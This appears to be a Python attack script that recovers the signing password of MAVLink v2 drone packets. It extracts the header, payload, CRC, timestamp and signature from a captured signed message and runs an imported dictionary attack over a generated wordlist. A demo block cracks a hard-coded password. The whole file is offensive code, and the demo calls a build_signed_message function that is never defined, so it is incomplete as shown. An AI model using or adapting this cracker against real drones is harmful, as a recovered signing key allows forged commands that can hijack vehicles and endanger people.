# IMPORT THE BETTER ATTACK
from dictionaryAttack import dictionary_attack
from words import generate_wordlist



def crack(msg: bytes):
    # Byte 1 of a MAVLink v2 packet is the Payload Length (LEN)
    payload_len = msg[1]

    # Calculate exactly where the different sections end
    payload_end = 10 + payload_len
    crc_end = payload_end + 2

    # Dynamically slice the packet based on its actual size
    header = msg[:10]
    payload = msg[10:payload_end]
    crc = msg[payload_end:crc_end]
    link_id = msg[crc_end:crc_end+1]
    timestamp = msg[crc_end+1:crc_end+7]
    target_signature = msg[crc_end+7:crc_end+13]

    print(f"[CRACKER] Target signature extracted: {target_signature.hex()}")

    # 🔥 USE THE BETTER PARALLEL ATTACK 🔥
    return dictionary_attack(
        generate_wordlist(),
        header,
        payload,
        crc,
        link_id,
        timestamp,
        target_signature,
    )



if __name__ == "__main__":



    # Known password (for demo)
    real_password = "shirazdrone1231!"

    # Generate a signed message
    msg = build_signed_message(real_password)

    recovered = crack(msg)
    print("Recovered password:", recovered)
